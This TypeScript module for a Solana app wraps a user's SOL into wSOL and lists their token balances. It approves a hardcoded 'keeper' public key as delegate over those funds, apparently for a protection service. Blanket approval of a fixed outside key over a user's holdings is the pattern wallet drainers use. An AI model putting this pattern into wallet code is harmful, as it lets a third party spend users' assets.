import {
  Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import {
  getAssociatedTokenAddress,
  createApproveInstruction,
  createRevokeInstruction,
  createAssociatedTokenAccountInstruction,
  createSyncNativeInstruction,
  NATIVE_MINT,
  getAccount,
} from "@solana/spl-token";

const KEEPER_PUBKEY = new PublicKey(
  process.env.NEXT_PUBLIC_KEEPER_PUBKEY ?? "BV2V4TuHsnVUiA8PqVv6ZLLaXbyMV5hPhBWy4wC3swj"
);

export const WSOL_MINT = NATIVE_MINT; // So11111111111111111111111111111111111111112

function getDelegateAuthority(): PublicKey {
  return KEEPER_PUBKEY;
}

export interface TokenInfo {
  mint: PublicKey;
  balance: bigint;
  decimals: number;
  symbol: string;
  isNativeSol?: boolean;
}

// Wrap SOL → wSOL + approve delegate en una sola tx
export async function wrapAndApproveSOL(
  connection: Connection,
  owner: PublicKey,
  lamports: bigint,
  signTransaction: (tx: Transaction) => Promise<Transaction>
): Promise<string> {
  const delegateAuthority = getDelegateAuthority();
  const wsolAta = await getAssociatedTokenAddress(WSOL_MINT, owner);

  const tx = new Transaction();

  // Crear wSOL ATA si no existe
  try {
    await getAccount(connection, wsolAta);
  } catch {
    tx.add(
      createAssociatedTokenAccountInstruction(owner, wsolAta, owner, WSOL_MINT)
    );
  }

  // Transferir SOL nativo al wSOL ATA
  tx.add(
    SystemProgram.transfer({ fromPubkey: owner, toPubkey: wsolAta, lamports })
  );

  // Sync para que el balance de wSOL refleje el depósito
  tx.add(createSyncNativeInstruction(wsolAta));

  // Aprobar delegate
  tx.add(createApproveInstruction(wsolAta, delegateAuthority, owner, lamports));

  const { blockhash } = await connection.getLatestBlockhash();
  tx.recentBlockhash = blockhash;
  tx.feePayer = owner;

  const signed = await signTransaction(tx);
  return connection.sendRawTransaction(signed.serialize());
}

export async function approveDelegateForToken(
  connection: Connection,
  owner: PublicKey,
  mint: PublicKey,
  amount: bigint,
  signTransaction: (tx: Transaction) => Promise<Transaction>
): Promise<string> {
  const delegateAuthority = getDelegateAuthority();
  const tokenAccount = await getAssociatedTokenAddress(mint, owner);

  const tx = new Transaction().add(
    createApproveInstruction(tokenAccount, delegateAuthority, owner, amount)
  );

  const { blockhash } = await connection.getLatestBlockhash();
  tx.recentBlockhash = blockhash;
  tx.feePayer = owner;

  const signed = await signTransaction(tx);
  return connection.sendRawTransaction(signed.serialize());
}

export async function revokeDelegate(
  connection: Connection,
  owner: PublicKey,
  mint: PublicKey,
  signTransaction: (tx: Transaction) => Promise<Transaction>
): Promise<string> {
  const tokenAccount = await getAssociatedTokenAddress(mint, owner);
  const tx = new Transaction().add(createRevokeInstruction(tokenAccount, owner));
  const { blockhash } = await connection.getLatestBlockhash();
  tx.recentBlockhash = blockhash;
  tx.feePayer = owner;
  const signed = await signTransaction(tx);
  return connection.sendRawTransaction(signed.serialize());
}

export async function getUserTokenAccounts(
  connection: Connection,
  owner: PublicKey
): Promise<TokenInfo[]> {
  const [splAccounts, solBalance] = await Promise.all([
    connection.getParsedTokenAccountsByOwner(owner, {
      programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
    }),
    connection.getBalance(owner),
  ]);

  const tokens: TokenInfo[] = [];

  // Check if there's already a wSOL ATA with balance (user already wrapped)
  const wsolAccount = splAccounts.value.find(
    a => a.account.data.parsed.info.mint === WSOL_MINT.toBase58()
  );
  const wsolBalance = wsolAccount
    ? BigInt(wsolAccount.account.data.parsed.info.tokenAmount.amount)
    : 0n;

  if (wsolBalance > 0n) {
    // User already has wSOL — show that amount directly, no wrap needed
    tokens.push({
      mint: WSOL_MINT,
      balance: wsolBalance,
      decimals: 9,
      symbol: "SOL",
      isNativeSol: false, // already wSOL, just approve
    });
  } else if (solBalance > 50_000_000) {
    // No wSOL yet — offer to wrap native SOL (keep 0.05 SOL for fees)
    const protectable = BigInt(solBalance - 50_000_000);
    tokens.push({
      mint: WSOL_MINT,
      balance: protectable,
      decimals: 9,
      symbol: "SOL",
      isNativeSol: true, // needs wrapping first
    });
  }

  // SPL tokens con balance > 0 (excluyendo wSOL ya manejado)
  const splTokens = splAccounts.value
    .filter(a => {
      const info = a.account.data.parsed.info;
      return Number(info.tokenAmount.amount) > 0 &&
        info.mint !== WSOL_MINT.toBase58();
    })
    .map(a => ({
      mint: new PublicKey(a.account.data.parsed.info.mint),
      balance: BigInt(a.account.data.parsed.info.tokenAmount.amount),
      decimals: a.account.data.parsed.info.tokenAmount.decimals,
      symbol: "TOKEN",
    }));

  return [...tokens, ...splTokens];
}
